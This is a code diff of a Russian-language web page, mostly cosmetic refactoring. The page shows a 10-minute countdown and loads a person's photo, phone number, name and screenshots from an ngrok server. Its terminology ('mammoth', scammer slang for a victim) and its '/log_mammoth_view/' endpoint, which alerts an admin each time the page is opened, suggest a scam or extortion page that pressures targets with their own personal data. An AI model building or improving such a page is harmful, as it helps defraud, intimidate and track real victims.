@@ -69,10 +69,10 @@
             margin-top: 4px;
         }
         
-        /* ===== ФОТО С КУРСОРОМ ===== */
+        /* ===== ФОТО В КРУГЕ ===== */
         .user-photo {
-            width: 250px;
-            height: 250px;
+            width: 200px;
+            height: 200px;
             border-radius: 50%;
             border: 4px solid #ff3355;
             margin: 0 auto 25px;
@@ -90,7 +90,7 @@
         .user-photo:hover { transform: scale(1.05); }
         .user-photo img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; pointer-events: none; }
         
-        /* ===== СКРИНШОТЫ С КУРСОРОМ ===== */
+        /* ===== СКРИНШОТЫ ===== */
         .screenshots img {
             width: 100%;
             border-radius: 8px;
@@ -108,7 +108,7 @@
         .screenshots .empty { cursor: default; }
         .screenshots .empty:hover { transform: none; box-shadow: none; }
         
-        /* ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПРОСМОТРА ФОТО ===== */
+        /* ===== МОДАЛЬНОЕ ОКНО ===== */
         .modal {
             display: none;
             position: fixed;
@@ -123,13 +123,8 @@
             padding: 20px;
             animation: fadeIn 0.3s ease;
         }
-        .modal.active {
-            display: flex;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
+        .modal.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .modal img {
             max-width: 100%;
             max-height: 90vh;
@@ -247,7 +242,7 @@
         </div>
     </div>
 
-    <!-- ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПРОСМОТРА ФОТО ===== -->
+    <!-- ===== МОДАЛЬНОЕ ОКНО ===== -->
     <div class="modal" id="modal">
         <span class="modal-close" id="modalClose">✕</span>
         <img id="modalImage" src="" alt="Увеличенное фото">
@@ -256,10 +251,10 @@
 
     <script>
         // ============================================================
-        // 0. ТАЙМЕР (С СОХРАНЕНИЕМ В localStorage)
+        // 0. ТАЙМЕР
         // ============================================================
-        const TOTAL_SECONDS = 600; // 10 минут
-        const TIMER_KEY = 'mammoth_timer_start_' + window.location.pathname; // УНИКАЛЬНЫЙ КЛЮЧ ДЛЯ КАЖДОЙ СТРАНИЦЫ!
+        const TOTAL_SECONDS = 600;
+        const TIMER_KEY = 'mammoth_timer_' + window.location.pathname;
         const timerDisplay = document.getElementById('timerDisplay');
         const timerContainer = document.querySelector('.timer-container');
         const timerLabel = document.querySelector('.timer-label');
@@ -267,23 +262,25 @@
         let remainingSeconds = TOTAL_SECONDS;
         let timerInterval = null;
         
-        // ПРОВЕРЯЕМ, ЕСТЬ ЛИ ВРЕМЯ В localStorage
         let startTime = localStorage.getItem(TIMER_KEY);
         
         if (startTime) {
-            // ЕСЛИ ЕСТЬ — СЧИТАЕМ СКОЛЬКО ПРОШЛО
             const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
             remainingSeconds = Math.max(0, TOTAL_SECONDS - elapsed);
             console.log('⏳ Таймер восстановлен:', remainingSeconds, 'сек');
         } else {
-            // ЕСЛИ НЕТ — СОХРАНЯЕМ ТЕКУЩЕЕ ВРЕМЯ
             startTime = Date.now().toString();
             localStorage.setItem(TIMER_KEY, startTime);
             remainingSeconds = TOTAL_SECONDS;
             console.log('⏳ Таймер запущен с 10:00');
         }
         
-        // ЕСЛИ ВРЕМЯ УЖЕ ВЫШЛО — ПОКАЗЫВАЕМ 00:00
+        function updateTimerDisplay() {
+            const mins = Math.floor(remainingSeconds / 60);
+            const secs = remainingSeconds % 60;
+            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        }
+        
         if (remainingSeconds <= 0) {
             timerDisplay.textContent = '00:00';
             timerDisplay.classList.add('ended');
@@ -304,25 +301,17 @@
                 updateTimerDisplay();
             }, 1000);
         }
-        
-        function updateTimerDisplay() {
-            const mins = Math.floor(remainingSeconds / 60);
-            const secs = remainingSeconds % 60;
-            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-        }
 
         // ============================================================
         // 1. ПОЛУЧАЕМ ID ИЗ URL
         // ============================================================
         const path = window.location.pathname;
         const shortId = path.substring(1);
-        
         const NGROK_URL = 'https://563f-178-88-32-33.ngrok-free.app';
-        
         console.log('🔍 ID из URL:', shortId);
         
         // ============================================================
-        // 2. ПЕРЕМЕННЫЕ ДЛЯ ГАЛЕРЕИ
+        // 2. ГАЛЕРЕЯ
         // ============================================================
         let allImages = [];
         let currentImageIndex = 0;
@@ -331,9 +320,6 @@
         const modalCounter = document.getElementById('modalCounter');
         const modalClose = document.getElementById('modalClose');
         
-        // ============================================================
-        // 3. ФУНКЦИЯ ОТКРЫТИЯ МОДАЛЬНОГО ОКНА
-        // ============================================================
         function openModal(index) {
             if (allImages.length === 0) return;
             currentImageIndex = index;
@@ -348,18 +334,11 @@
             document.body.style.overflow = '';
         }
         
-        // ============================================================
-        // 4. ЗАКРЫТИЕ ПО КЛИКУ НА ФОН
-        // ============================================================
         modal.addEventListener('click', function(e) {
             if (e.target === modal) closeModal();
         });
-        
         modalClose.addEventListener('click', closeModal);
         
-        // ============================================================
-        // 5. КЛАВИШИ ВЛЕВО/ВПРАВО ДЛЯ ГАЛЕРЕИ
-        // ============================================================
         document.addEventListener('keydown', function(e) {
             if (!modal.classList.contains('active')) return;
             if (e.key === 'Escape') closeModal();
@@ -381,23 +360,17 @@
             const headers = new Headers();
             headers.append('ngrok-skip-browser-warning', 'true');
             
-            // ============================================================
-            // 6. ОТПРАВКА УВЕДОМЛЕНИЯ АДМИНУ
-            // ============================================================
+            // ===== УВЕДОМЛЕНИЕ АДМИНУ =====
             const notifyUrl = `${NGROK_URL}/log_mammoth_view/${shortId}`;
             console.log('📢 Отправка уведомления админу:', notifyUrl);
-            
             fetch(notifyUrl, { headers })
                 .then(response => response.json())
                 .then(data => console.log('✅ Уведомление отправлено:', data))
                 .catch(error => console.error('❌ Ошибка уведомления:', error));
             
-            // ============================================================
-            // 7. ЗАГРУЖАЕМ ФОТО
-            // ============================================================
+            // ===== ФОТО =====
             const photoUrl = `${NGROK_URL}/photo/${shortId}`;
             console.log('📸 Запрос фото:', photoUrl);
-            
             fetch(photoUrl, { headers })
                 .then(response => {
                     if (!response.ok) throw new Error(`HTTP ${response.status}`);
@@ -407,13 +380,11 @@
                     console.log('📸 Фото получено, размер:', blob.size, 'байт');
                     const url = URL.createObjectURL(blob);
                     allImages.push(url);
-                    
                     const img = document.createElement('img');
                     img.src = url;
                     img.alt = 'Фото пользователя';
                     img.style.cursor = 'pointer';
                     img.onclick = function() { openModal(0); };
-                    
                     document.getElementById('userPhoto').innerHTML = '';
                     document.getElementById('userPhoto').appendChild(img);
                 })
@@ -422,12 +393,9 @@
                     document.getElementById('userPhoto').innerHTML = '<span>❌ Фото не найдено</span>';
                 });
             
-            // ============================================================
-            // 8. ЗАГРУЖАЕМ ДАННЫЕ
-            // ============================================================
+            // ===== ДАННЫЕ =====
             const dataUrl = `${NGROK_URL}/${shortId}`;
             console.log('📡 Запрос данных:', dataUrl);
-            
             fetch(dataUrl, { headers })
                 .then(response => {
                     if (!response.ok) throw new Error(`HTTP ${response.status}`);
@@ -435,28 +403,22 @@
                 })
                 .then(data => {
                     console.log('📦 Данные получены:', data);
-                    
                     if (data.success) {
                         if (data.phone) document.getElementById('userPhone').textContent = data.phone;
                         if (data.name) document.getElementById('userName').textContent = data.name;
                         if (data.data) document.getElementById('userData').textContent = data.data;
-                        
                         if (data.screenshots && data.screenshots.length > 0) {
                             const container = document.getElementById('screenshots');
                             container.innerHTML = '';
-                            
                             data.screenshots.forEach((src, index) => {
                                 const img = document.createElement('img');
                                 const imgUrl = 'data:image/jpeg;base64,' + src;
                                 img.src = imgUrl;
                                 img.alt = 'Скриншот ' + (index + 1);
                                 img.style.cursor = 'pointer';
-                                
                                 allImages.push(imgUrl);
-                                
                                 const imgIndex = allImages.length - 1;
                                 img.onclick = function() { openModal(imgIndex); };
-                                
                                 img.onerror = function() {
                                     this.outerHTML = `<div class="empty">❌ Ошибка загрузки скриншота</div>`;
                                 };
